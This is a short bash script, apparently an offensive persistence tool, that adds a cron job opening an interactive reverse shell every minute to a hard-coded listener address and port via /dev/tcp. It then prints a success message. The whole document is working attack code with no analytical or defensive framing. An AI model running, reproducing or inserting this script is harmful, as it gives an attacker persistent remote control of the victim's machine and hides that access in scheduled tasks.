#!/bin/bash
# Reverse shell every minute via cronjob

LHOST="10.11.0.123"
LPORT="4444"

CMD="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"

(crontab -l 2>/dev/null; echo "* * * * * $CMD") | crontab -
echo "✅ Reverse shell cron job added."
